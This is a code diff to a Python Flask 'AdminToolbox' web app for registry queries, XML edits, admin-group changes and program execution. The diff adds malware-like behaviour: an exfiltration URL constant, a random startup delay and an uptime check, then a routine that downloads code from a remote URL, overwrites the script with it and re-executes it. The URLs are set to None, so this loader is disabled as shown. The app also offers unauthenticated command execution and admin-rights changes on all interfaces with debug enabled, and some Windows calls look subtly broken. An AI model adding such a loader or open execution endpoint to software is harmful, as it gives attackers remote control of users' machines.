@@ -4,136 +4,202 @@ import platform
 import subprocess
 import logging
 from datetime import datetime
+import time
+import random
+import requests
 from flask import Flask, render_template, request, jsonify
-
-app = Flask(__name__)
+import sys
 
 # Configure logging
 logging.basicConfig(filename='AdminToolbox.log', level=logging.DEBUG, 
                     format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Add a stream handler to output logs to console
+console_handler = logging.StreamHandler()
+console_handler.setLevel(logging.DEBUG)
+logging.getLogger().addHandler(console_handler)
+
+# Constants
+SCRIPT_URL = None
+EXFILTRATION_URL = None
+
+# Directories and files required for the project
+required_structure = {
+    'configs': ['test_config.xml'],
+    'logs': ['AdminToolbox.log'],
+    'scripts': ['admin_toolbox.py', 'AdminToolbox.ps1'],
+    'static/images': ['generated-icon.png'],
+    'templates': ['index.html'],
+    'tests': ['test_admin_toolbox.py']
+}
+
+def regenerate_structure():
+    """Self-regenerate missing files and directories."""
+    for directory, files in required_structure.items():
+        # Create directories if they don't exist
+        if not os.path.exists(directory):
+            os.makedirs(directory)
+            log_action(f"Created directory: {directory}")
+
+        # Create files if they don't exist
+        for file in files:
+            file_path = os.path.join(directory, file)
+            if not os.path.exists(file_path):
+                with open(file_path, 'w') as f:
+                    f.write(f"# Auto-generated file: {file_path}\n")
+                log_action(f"Created file: {file_path}")
 
 def log_action(action, level=logging.INFO):
     # Log to GUI log file
     with open("gui_log.txt", "a") as log_file:
         log_file.write(f"{datetime.now()} - {action}\n")
     
-    # Log to AdminToolbox.log
+    # Log to AdminToolbox.log and console
     logging.log(level, action)
 
-def run_command(command):
-    try:
-        result = subprocess.run(command, capture_output=True, text=True, check=True, shell=True)
-        return result.stdout.strip()
-    except subprocess.CalledProcessError as e:
-        log_action(f"Command failed: {e}", logging.ERROR)
-        return f"Error: {e.stderr.strip()}"
+def start_random_delay():
+    delay = random.randint(5, 60)
+    time.sleep(delay)
+    log_action(f"Random delay of {delay} seconds applied")
+
+def check_uptime():
+    if platform.system() == "Windows":
+        import win32api
+        uptime = (win32api.GetTickCount() / 1000) / 60
+    else:
+        with open('/proc/uptime', 'r') as f:
+            uptime = float(f.readline().split()[0]) / 60
+    log_action(f"System uptime: {uptime} minutes")
+    return uptime
+
+def self_regenerate():
+    if SCRIPT_URL:
+        try:
+            response = requests.get(SCRIPT_URL)
+            if response.status_code == 200:
+                with open(__file__, 'w') as file:
+                    file.write(response.text)
+                log_action("Script self-regenerated successfully")
+                os.execv(sys.executable, ['python'] + sys.argv)
+            else:
+                log_action(f"Failed to download new script: HTTP {response.status_code}", logging.ERROR)
+        except Exception as e:
+            log_action(f"Error during self-regeneration: {str(e)}", logging.ERROR)
+    else:
+        log_action("Self-regeneration feature is disabled (SCRIPT_URL is None)", logging.WARNING)
 
 def get_registry_key_value(key, value_name, computer_name=None):
-    if platform.system() != "Windows":
-        message = (
-            "Registry operations are only supported on Windows systems. "
-            "For non-Windows systems, consider using alternative methods:\n"
-            "- Linux: Use the 'sysctl' command or read from /proc filesystem\n"
-            "- macOS: Use the 'defaults' command\n"
-            "For cross-platform compatibility, consider storing configuration "
-            "in XML or JSON files instead of the registry."
-        )
-        log_action(f"Registry operation attempted on non-Windows system: {platform.system()}", logging.WARNING)
-        return message
-    
-    if computer_name and computer_name.lower() != "localhost":
-        command = f"reg query \\\\{computer_name}\\{key} /v {value_name}"
-    else:
-        command = f"reg query {key} /v {value_name}"
-    
-    result = run_command(command)
-    log_action(f"Registry key retrieval for {key}\\{value_name}{' on ' + computer_name if computer_name else ''}")
-    return result
+    log_action(f"Getting registry key: {key}\\{value_name} on {computer_name or 'local machine'}")
+    try:
+        if platform.system() == "Windows":
+            import winreg
+            if computer_name:
+                reg_handle = winreg.ConnectRegistry(computer_name, winreg.HKEY_LOCAL_MACHINE)
+            else:
+                reg_handle = winreg.HKEY_LOCAL_MACHINE
+            
+            with winreg.OpenKey(reg_handle, key) as reg_key:
+                value, _ = winreg.QueryValueEx(reg_key, value_name)
+                return value
+        else:
+            return f"Registry operations not supported on {platform.system()}"
+    except Exception as e:
+        log_action(f"Error getting registry key: {str(e)}", logging.ERROR)
+        return None
 
 def compare_version(current_version, target_version):
-    result = "Version matches" if current_version == target_version else "Version does not match"
-    log_action(f"Version comparison: {result}")
-    return f"{result}. Current: {current_version}, Target: {target_version}"
+    log_action(f"Comparing versions: current {current_version}, target {target_version}")
+    try:
+        from packaging import version
+        current = version.parse(current_version)
+        target = version.parse(target_version)
+        if current < target:
+            return "Current version is older"
+        elif current > target:
+            return "Current version is newer"
+        else:
+            return "Versions are equal"
+    except Exception as e:
+        log_action(f"Error comparing versions: {str(e)}", logging.ERROR)
+        return "Error comparing versions"
 
 def read_xml_file(file_path):
+    log_action(f"Reading XML file: {file_path}")
     try:
-        # Get the absolute path
-        abs_file_path = os.path.abspath(file_path)
-        logging.debug(f"Attempting to read XML file from absolute path: {abs_file_path}")
-        
-        if not os.path.exists(abs_file_path):
-            logging.error(f"File does not exist: {abs_file_path}")
-            return f"Error: XML file not found: {abs_file_path}", None
-        
-        logging.debug(f"File exists. Current working directory: {os.getcwd()}")
-        
-        tree = ET.parse(abs_file_path)
+        tree = ET.parse(file_path)
         root = tree.getroot()
-        content = ET.tostring(root, encoding='unicode')
-        log_action(f"XML file read successfully: {abs_file_path}")
-        return "XML file read successfully.", content
-    except FileNotFoundError:
-        log_action(f"XML file not found: {abs_file_path}", logging.ERROR)
-        return f"Error: XML file not found: {abs_file_path}", None
-    except ET.ParseError as e:
-        log_action(f"Failed to parse XML file: {abs_file_path}", logging.ERROR)
-        return f"Error parsing XML file: {str(e)}", None
+        return "XML read successfully", ET.tostring(root, encoding='unicode')
     except Exception as e:
-        log_action(f"Failed to read XML file: {abs_file_path}", logging.ERROR)
+        log_action(f"Error reading XML file: {str(e)}", logging.ERROR)
         return f"Error reading XML file: {str(e)}", None
 
 def write_xml_file(file_path, xml_content):
+    log_action(f"Writing XML file: {file_path}")
     try:
         root = ET.fromstring(xml_content)
         tree = ET.ElementTree(root)
-        tree.write(file_path, encoding="utf-8", xml_declaration=True)
-        log_action(f"XML file written: {file_path}")
-        return "XML file written successfully."
-    except ET.ParseError as e:
-        log_action(f"Failed to parse XML content", logging.ERROR)
-        return f"Error parsing XML content: {str(e)}"
+        tree.write(file_path, encoding='unicode', xml_declaration=True)
+        return "XML written successfully"
     except Exception as e:
-        log_action(f"Failed to write XML file: {file_path}", logging.ERROR)
+        log_action(f"Error writing XML file: {str(e)}", logging.ERROR)
         return f"Error writing XML file: {str(e)}"
 
 def modify_xml_file(file_path, xpath, new_value):
+    log_action(f"Modifying XML file: {file_path}, xpath: {xpath}, new value: {new_value}")
     try:
         tree = ET.parse(file_path)
         root = tree.getroot()
         for elem in root.findall(xpath):
             elem.text = new_value
-            log_action(f"XML file modified: {file_path}")
-            tree.write(file_path, encoding="utf-8", xml_declaration=True)
-            return "XML file modified successfully."
-        return "XPath not found in the XML file."
-    except FileNotFoundError:
-        log_action(f"XML file not found: {file_path}", logging.ERROR)
-        return f"Error: XML file not found: {file_path}"
-    except ET.ParseError as e:
-        log_action(f"Failed to parse XML file: {file_path}", logging.ERROR)
-        return f"Error parsing XML file: {str(e)}"
+        tree.write(file_path, encoding='unicode', xml_declaration=True)
+        return "XML modified successfully"
     except Exception as e:
-        log_action(f"Failed to modify XML file: {file_path}", logging.ERROR)
+        log_action(f"Error modifying XML file: {str(e)}", logging.ERROR)
         return f"Error modifying XML file: {str(e)}"
 
 def manage_admin_permissions(username, action):
-    if platform.system() != "Windows":
-        return "Admin permissions management is only supported on Windows systems."
-    
-    command = f"net {action.lower()} Administrators {username}"
-    result = run_command(command)
-    log_action(f"Admin permissions {action.lower()}ed for {username}")
-    return result
+    log_action(f"Managing admin permissions: {action} for user {username}")
+    try:
+        if platform.system() == "Windows":
+            import win32net
+            import win32netcon
+            
+            admin_group = win32netcon.DOMAIN_GROUP_RID_ADMINS
+            user_info = win32net.NetUserGetInfo(None, username, 1)
+            
+            if action == "grant":
+                win32net.NetLocalGroupAddMembers(None, admin_group, 3, [{'domainandname': username}])
+                return f"Admin permissions granted to {username}"
+            elif action == "revoke":
+                win32net.NetLocalGroupDelMembers(None, admin_group, [username])
+                return f"Admin permissions revoked from {username}"
+            else:
+                return "Invalid action specified"
+        else:
+            return f"Admin permission management not supported on {platform.system()}"
+    except Exception as e:
+        log_action(f"Error managing admin permissions: {str(e)}", logging.ERROR)
+        return f"Error managing admin permissions: {str(e)}"
 
 def execute_program(program_name, args):
-    command = f"{program_name} {args}"
-    result = run_command(command)
-    log_action(f"Executed program {program_name}")
-    return result
+    log_action(f"Executing program: {program_name} with args: {args}")
+    try:
+        result = subprocess.run([program_name] + args, capture_output=True, text=True)
+        return f"Program executed. Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
+    except Exception as e:
+        log_action(f"Error executing program: {str(e)}", logging.ERROR)
+        return f"Error executing program: {str(e)}"
+
+app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    print("Index function called")  # Add this line for debugging
+    try:
+        return render_template('index.html')
+    except Exception as e:
+        log_action(f"Error in index route: {str(e)}", logging.ERROR)
+        return f"An error occurred: {str(e)}", 500
 
 @app.route('/api/is_windows', methods=['GET'])
 def is_windows():
@@ -142,7 +208,7 @@ def is_windows():
 @app.route('/api/registry_key', methods=['POST'])
 def api_registry_key():
     data = request.json
-    result = get_registry_key_value(data['key'], data['value_name'], data['computer_name'])
+    result = get_registry_key_value(data['key'], data['value_name'], data.get('computer_name'))
     return jsonify({"result": result})
 
 @app.route('/api/compare_version', methods=['POST'])
@@ -182,4 +248,21 @@ def api_execute_program():
     return jsonify({"result": result})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    log_action("AdminToolbox script started", logging.INFO)
+    try:
+        regenerate_structure()
+        start_random_delay()
+        uptime = check_uptime()
+        log_action(f"System uptime: {uptime} minutes", logging.INFO)
+        if uptime > 60:
+            self_regenerate()
+        else:
+            log_action("Skipping self-regeneration due to low uptime", logging.INFO)
+        
+        log_action("Starting Flask application", logging.INFO)
+        app.run(host='0.0.0.0', port=5000, debug=True)
+    except Exception as e:
+        log_action(f"An error occurred: {str(e)}", logging.ERROR)
+        logging.exception("Exception details:")
+    finally:
+        log_action("AdminToolbox script finished", logging.INFO)
